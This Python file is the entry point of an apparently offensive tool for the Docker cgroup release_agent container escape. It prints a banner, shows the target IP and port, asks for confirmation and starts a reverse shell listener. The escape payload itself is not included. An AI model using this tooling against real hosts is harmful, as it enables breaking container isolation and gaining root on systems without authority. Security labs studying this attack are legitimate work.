from DockerEscape.rev_shell_handler import listen_shell
import sys

class color:
	PURPLE = '\033[1;35;48m'
	CYAN = '\033[1;36;48m'
	BOLD = '\033[1;37;48m'
	BLUE = '\033[1;34;48m'
	GREEN = '\033[1;32;48m'
	YELLOW = '\033[1;33;48m'
	RED = '\033[1;31;48m'
	BLACK = '\033[1;30;48m'
	UNDERLINE = '\033[4;37;48m'
	END = '\033[1;37;0m'

# This script functions as an entry point for the attack
def run(victim_info, attacker_info, general_info, arguments):
	# Don't print if the task is being repeated
	if arguments.repeat == None:
		print(color.CYAN + '''
		##################################################################################
		#										 #
		# 	           DOCKER CGROUP RELEASE AGENT VULNERABILITY			 #		
		#										 #
		##################################################################################
		''' + color.END)
		print(color.GREEN + '''[*]''' + color.END + ''' This attack will take advantage of a Docker with too much privileges that allow for
an attacker to not only break isolation but to be able to run scripts with higher privileges, possibily root, within the host system''')
		print(color.GREEN + '''[*]''' + color.END + ''' If don't have an already configured docker machine for this attack or if you want
to configure your own to perform this attack, please look at the information provided in the
docker-compose.yml in the directory /Docker that comes with this project''')
		print(color.GREEN + '[*]' + color.END + ' Targeted machine: {ip}:{port}'.format(ip = victim_info['ip'], port = int(victim_info['port'])))
		print(color.YELLOW + '[?]' + color.END + ' Do you wish to proceed? (y|n)')
		n = input()
		if n != 'Y' and n != 'y':
			sys.exit(color.RED + 'Aborting exploit!' + color.END)
	
		print(color.GREEN + '[*]' + color.END + ' Proceeding with the reverse shell handler')
	listen_shell(victim_info, attacker_info, general_info, victim_info['secure'] == 'True')
	
	
